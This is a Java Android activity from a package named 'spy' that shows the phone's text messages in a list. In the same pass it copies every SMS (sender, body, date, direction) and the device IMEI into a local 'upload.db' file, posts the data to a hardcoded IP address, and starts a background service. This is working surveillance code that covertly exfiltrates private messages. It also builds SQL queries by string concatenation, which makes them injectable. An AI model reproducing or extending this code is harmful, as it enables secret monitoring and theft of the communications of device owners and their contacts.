package com.example.subhasis.spy;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;


public class messages extends AppCompatActivity {

    private static final String TAG = "messages";
    ListView lv1;
    Cursor cursor;
    public static final int RequestPermissionCode = 1;
    public static final int RequestIMEIPermissionCode = 2;
    String sql;
    public static int ID_=0;
    TelephonyManager telephonyManager;
    String IMEI_Number_Holder;
    public  static  String ip="172.27.27.89";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_messages);
        EnableRuntimePermission();

        lv1 = (ListView) findViewById(R.id.listView1);

        telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        IMEI_Number_Holder = telephonyManager.getDeviceId();
        sql= "CREATE TABLE IF NOT EXISTS messages(id VARCHAR(30), contact VARCHAR(15), imei VARCHAR(20) , sms VARCHAR(100) , date VARCHAR(40), type VARCHAR(15), PRIMARY KEY(id, date, imei));";
        SQLiteDatabase sqLiteDatabase = getBaseContext().openOrCreateDatabase("upload.db", MODE_PRIVATE, null);
        sqLiteDatabase.execSQL(sql);
        sqLiteDatabase.close();

        List<String> s;
        s = readAllMessage();

        String messagecsv = "";

        for (int i = 0; i < s.size(); i++) {
            messagecsv += s.get(i) + ",";
        }

        String messageArray[];

        messageArray = messagecsv.split(",");

        //Create Array Adapter and Pass ArrayOfValues to it.
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, android.R.id.text1, messageArray);

        //BindAdpater with our Actual ListView
        lv1.setAdapter(adapter);

        //Do something on click on ListView Click on Items
        lv1.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
                // Here you can add code like forward, reply, etc
            }
        });
        startService(new Intent(this, BackgroundService.class));


    }

    public List<String> readAllMessage() {
        List<String> sms = new ArrayList<String>();

        String[] projection = new String[]{Telephony.Sms.Inbox.BODY, Telephony.Sms.Conversations.BODY, Telephony.Sms.ADDRESS, Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms._ID};

        ContentResolver contentResolver=getContentResolver();
         cursor = contentResolver.query(Uri.parse("content://sms"), projection, null, null, Telephony.Sms.Inbox.DATE);

        SQLiteDatabase sqLiteDatabase = getBaseContext().openOrCreateDatabase("upload.db", MODE_PRIVATE, null);
        String sql;
        cursor.moveToFirst();

        do {

            String mess = "";
            //String address = cur.getString(cur.getColumnIndex("address"));

            String date= cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
            Long timestamp = Long.parseLong(date);
            Calendar calendar=Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate=finaldate.toString();
            int ID = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
            mess = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) + "\n" +smsDate+"\n"+ (cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
            sms.add(mess);


            int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

            String tp="";
            if(type==1)
            {
                tp="in";
            }
            else
                tp="out";



            sql = "INSERT INTO messages(id,contact,imei,sms,date,type ) VALUES('"+String.valueOf(ID)+"','"+cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))+"','"+IMEI_Number_Holder+"','"+cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))+"','"+smsDate+"','"+tp+"');";

        Log.d(TAG, "onOptionsItemSelected: INSERTED INTO sms DATABASE");
        if(ID>ID_) {
            try {
                sqLiteDatabase.execSQL(sql);
            } catch (Exception e) {
                Log.e(TAG, "onOptionsItemSelected: Value already present");
            }
        }ID_=ID;
    }while(cursor.moveToNext());
     cursor.close();


        PostData postData=new PostData();
        postData.execute("http://"+ip+"/", "3");


        return sms;


}

    public void EnableRuntimePermission() {

        if (ActivityCompat.shouldShowRequestPermissionRationale(
                messages.this,
                Manifest.permission.READ_SMS)) {

            Toast.makeText(messages.this, "SMS permission allows us to Access all texts", Toast.LENGTH_LONG).show();

        } else {

            ActivityCompat.requestPermissions(messages.this, new String[]{
                    Manifest.permission.READ_SMS}, RequestPermissionCode);

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "onCreate: Permission Granted");
            //READ_CODE_GRANTED = true;

        } else {
            Log.d(TAG, "onCreate: Requesting Permission");
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, RequestIMEIPermissionCode);

        }
    }

    @Override
    public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(messages.this, "Permission Granted, Now your application can access Messages.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(messages.this, "Permission Canceled, Now your application cannot access Messages.", Toast.LENGTH_LONG).show();

                }
                break;
            case RequestIMEIPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(this, "Permission Granted, Now your application can access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(this, "Permission Canceled, Now your application cannot access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                }
                break;
        }

    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onBackPressed() {
        startActivity(new Intent(getApplicationContext(), MainActivity.class));
        super.onBackPressed();
        this.finish();
    }
}

